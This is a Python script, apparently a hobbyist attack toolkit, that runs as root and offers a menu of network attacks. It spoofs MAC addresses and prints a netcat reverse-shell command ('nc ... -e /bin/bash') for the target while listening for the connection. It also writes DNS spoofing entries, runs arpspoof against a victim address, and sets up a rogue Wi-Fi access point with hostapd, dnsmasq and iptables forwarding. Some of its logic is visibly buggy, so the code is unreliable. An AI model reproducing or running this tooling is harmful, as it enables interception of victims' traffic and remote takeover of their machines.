import os
import time
import base64


os.system("clear")
Red = "\u001b[31m"


print("""
  /|\                   /                  
 / | \                 /                   
/  |  \            _  /____                
   |    | | |\/|  |_|     / /|\ /\ |\ |\/| 
   |    |\| |  |         /   |  \/ |/ |/\| 
   |    | | |  |        /    |  /\ |\ |  | 
                                           

""")


def checkroot():

    if os.geteuid()==0:
       print("Start")
    else:
       print("[+] Run Script as root")
       exit()
checkroot()

def interface():
    global interface
    
    interface=os.popen("route | awk '/Iface/{getline; print $8}'").read()
    interface=interface.replace("\n", "")
  
    #print(interface)

interface()

NICchoice=str(input("Do You want to change NIC : "))
Nchoice=NICchoice.upper()
if Nchoice=="N":
   print("[+]Changing the NIC")
elif Nchoice=="Y":
   print("[+] Inscicure Mode") 
   Schoice=str(input("Set Manuelly NIC:"))
   Schoice=Schoice.upper()
   if Schoice=="Y":
      Mac=str(input("Enter a MAC 00:00:00:00:00:00 : "))
      os.system("ifconfig %s down" % (interface))
      time.sleep(1)
      os.system("macchanger -a %s -m %s" % (interface, Mac))
      time.sleep(1)
      os.system("ifconfig %s up" % (interface))
      time.sleep(1)
      os.system("ifconfig %s down" % (interface))
      time.sleep(1)
      os.system("ifconfig %s up" % (interface))
      os.system("ifconfig %s down" % (interface))
      time.sleep(1)
      os.system("ifconfig %s up" % (interface))
      print("[+] Changed Succesfully")
      time.sleep(1)
   else:
      os.system("ifconfig %s down" % (interface))
      time.sleep(1)
      os.system("macchanger -a %s -r" % (interface))
      time.sleep(1)
      os.system("ifconfig %s up" % (interface))


    
else:
   print("incorrect choise")
   exit()
inf_ch=input("do you want to set interface defult ' %s ' :"% (interface))
if inf_ch!="":
   interface=inf_ch

print(""""
1) Reverse shell
2) DNS spoofing
3) ARP spoofing
4) Fake Acces point

""")
choice=int(input("Storm@Attack# "))

if choice==1:
   print("""
   1) normal reverse shell
   """)
   shellChoice=int(input("shell@Listen# "))
   if shellChoice==1:
      shellHost=str(input("Enter LHOST: "))
      shellPort=int(input("Enter LPORT: "))

      print("[+] Exec this command in the target machine: nc -nvv %s %s -e /bin/bash" % (shellHost, shellPort))

      os.system("nc -nlvp %s" % (shellPort))
   #else:   
   #   exit()

elif choice==2:
   print("[+] Attack Configuration ")
   with open("/root/spoof.txt", "w") as s:
      while True:
         url=str(input("Enter URL : "))
         redirect=str(input("Redirect to : "))
         s_choice=str(input("Do you want to add another URL (y) or (n) : "))
         s.write(redirect + " " + url + "\n")
         if s_choice=="n":
            break
      #s.write(redirect + " " + url + "\n")
      s.close()

elif choice==3:
   print("[*] Attack configuration \n")
   vectim_ip=str(input("enter Victim   address : "))
   def_gw=str(input("Enter gatway default(192.168.1.1) : "))
   if def_gw=="":
      def_gtw="192.168.1.1"
   print("[+] Attack Started check for update")
   os.system("gnome-terminal --command='arpspoof -i % -r %s -t %s'"% (def_gtw, vectim_ip, interface))
   os.system("arpspoof -i %s -t %s -r %s"% (interface, vectim_ip, def_gtw))

elif choice==4:
   print("Starting Fake Acces point")
   Aname=str(input("Enter Name of Acces point : "))
   Apassword=str(input("Enter password : "))
   DHCPrangeF=int(input("Enter DHCP range TO : "))
   #DHCPrangeT=int(input("Enter DHCP range TO : "))
   DHCPtime=int(input("Enter DHCP relased time : "))
   channel=int(input("Enter channel : "))

   print("--Starting Fake Acces point--")
   Ichoice=str(input("give the victim acces to the internet (y) or (n) : "))
  
   print("[+] changing the NIC to monitor mode")
   os.system("ifconfig %s down"% (interface))
   time.sleep(1)
   os.system("iwconfig %s mode monitor"% (interface))
   time.sleep(1)
   os.system("ifconfig %s up"% (interface))
   time.sleep(2)

  # print("[+] changing MAC address")

  # os.system("ifconfig wlan0 down")
 #  time.sleep(1)
  # os.system("macchanger -a wlan0 -r")
 #  time.sleep(1)
  # os.system("ifconfig wlan0 up")


   with open("/root/accesspoint/dnsmasq.conf", "w") as ad:
      confugiration="""interface=%s
dhcp-range=192.168.1.2,192.168.1.%s,255.255.255.0,%sh
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
   """%(interface, DHCPrangeF, DHCPtime)
      ad.writelines(confugiration)
   ad.close()

   with open("/root/accesspoint/hostapd.conf", "w") as ah:
      hostpadconf="""interface=%s
driver=nl80211
ssid=%s
hw_mode=g
channel=%s
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=%s
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
"""%(interface, Aname, channel, Apassword)
      ah.writelines(hostpadconf)
   ah.close()

   time.sleep(2)
   print("[+] ATTACK started check for update")

   os.system("gnome-terminal --command='ifconfig %s up 192.168.1.1 netmask 255.255.255.0'"% (interface))
   time.sleep(2)

   os.system("gnome-terminal --command='route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1'")
   time.sleep(1)
   os.system("gnome-terminal --command='dnsmasq -C /root/accesspoint/dnsmasq.conf -d'")

   time.sleep(1)
   
   os.system("gnome-terminal --command='hostapd /root/accesspoint/hostapd.conf'")
   time.sleep(4)
   
   if Ichoice.upper()=="Y":
      gter="gnome-terminal --command='"
      gter_f="'"
   else:
      gter=""
      gter_f=""


      os.system("%sifconfig %s up 192.168.1.1 netmask 255.255.255.0%s"% (gter, interface, gter_f))
      time.sleep(1)
   #os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
   #time.sleep(2)
      os.system("%sdnsmasq -C /root/accesspoint/dnsmasq.conf -d%s"% (gter, gter_f))
   if Ichoice.upper()=="Y":
      
      con_inf=input("Enter interface Name def ' eth0 ' :")
      if con_inf!="":
         pass
      else:
         con_inf="eth0"
      cm1="gnome-terminal --command='iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE'"% (con_inf)
      cm2="gnome-terminal --command='iptables --append FORWARD --in-interface %s -j ACCEPT'"% (interface)
      os.system(cm1)
      os.system(cm2)
      print(Red +"[+] Close the opened windows to stop the Attack")
   


   

